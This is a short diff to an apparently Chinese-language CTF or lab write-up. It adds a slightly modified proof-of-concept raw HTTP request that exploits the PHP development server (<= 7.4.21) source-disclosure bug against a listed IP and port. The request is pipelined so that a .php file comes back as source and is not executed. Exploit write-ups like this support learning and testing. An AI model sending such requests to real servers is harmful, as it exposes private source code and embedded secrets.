@@ -18,4 +18,13 @@ Hello World!
 这里找到一个`PHP Development Server <= 7.4.21 - 远程源码泄露`的漏洞
 https://projectdiscovery.io/blog/php-http-server-source-disclosure
 可以把php文件作为静态文件输出，而不会执行，这样就能看到源码了。
-直接用文章的poc。
+直接用文章的poc。（要稍微修改一下）
+```http
+GET / HTTP/1.1\r\n
+Host: 101.245.72.127:8888\r\n
+\r\n
+\r\n
+GET /nihao.ph HTTP/1.1\r\n
+\r\n
+
+```
